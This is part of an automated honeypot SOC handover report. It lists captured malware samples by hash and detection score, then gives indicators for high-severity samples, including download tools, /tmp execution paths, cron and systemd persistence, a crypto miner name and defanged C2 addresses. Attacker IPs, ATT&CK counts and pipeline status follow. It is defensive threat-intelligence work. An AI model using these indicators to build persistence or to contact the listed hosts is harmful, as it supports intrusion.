| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `62.8.8[.]13` | FR | Societe Francaise Du Radiotelephone - SFR SA | **100** ⚠️ | 2 |
| `40.74.211[.]225` | US | Microsoft Corporation | **100** ⚠️ | 6 |
| `92.118.39[.]14` | RO | DMZHOST | **100** ⚠️ | 50 |
| `106.15.236[.]209` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 46 |
| `137.184.169[.]96` | CA | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `192.248.150[.]180` | GB | The Constant Company, LLC. | **100** ⚠️ | 50 |
| `66.132.172[.]214` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `92.118.39[.]49` | RO | DMZHOST | **100** ⚠️ | 50 |
| `35.206.151[.]215` | BE | Google LLC | **100** ⚠️ | 7 |
| `66.132.159[.]81` | US | Censys, Inc. | **100** ⚠️ | 7 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 239 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 234 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 108 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 22 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 22 |

---

## 🔕 False Positive Summary (51 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 1 below threshold 25 | 6 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 5 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 3 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 429 cases |
| Tool 34  | Credential Extractor        | ✅ 6750 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 25 fingerprints |
| Tool 36  | Command Clustering          | ✅ 125 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 199 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 51 filtered (11.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 98 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 227 priority case(s) shown individually · 137 recon entry/entries in table (11 group(s) consolidating 25 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-11T19:03:33Z_
